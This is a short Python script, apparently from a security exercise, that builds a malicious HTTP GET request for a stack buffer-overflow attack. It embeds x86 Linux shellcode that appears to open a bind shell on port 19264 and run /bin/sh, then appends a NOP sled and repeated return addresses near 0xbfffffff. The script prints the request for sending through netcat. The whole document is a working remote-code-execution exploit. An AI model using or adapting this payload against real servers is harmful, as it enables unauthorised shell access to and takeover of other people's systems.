# Creates a GET request for netcat
# Top address of stack is 0xbfffffff
# Desired Return address is an offset of this which is somewhere in address of top - 200 or 300 or 400
# This address needs to be reversed when sent to the server as shown bellow
# address = "\\xbf\\xff\\xff\\x37"

address = "\\x37\\xff\\xff\\xbf"


addressLen = 35
noopLen = 300

# This changes based on the shell code used
shellCodeLength = 92

shellcode = "\\x31\\xc0\\x50\\x40\\x89\\xc3\\x50\\x40\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x66\\x68\\x4B\\x40\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x40\\x89\\x44\\x24\\x04\\x43\\x43\\xb0\\x66\\xcd\\x80\\x83\\xc4\\x0c\\x52\\x52\\x43\\xb0\\x66\\xcd\\x80\\x93\\x89\\xd1\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";

# In bytes
totalLength = (4 * addressLen) + noopLen + shellCodeLength

# Total Length % 256 must be < 100
if (totalLength % 256 >= 100):
	print("Incorrect Total Length of String")                                                                                 #^ PORT NUMBER   = 19264

request = "GET /"

request += shellcode

for i in range(noopLen):
    request += "\\x90"

for i in range(addressLen):
    request += address


request += " HTTP"



print('"' + request + '"')
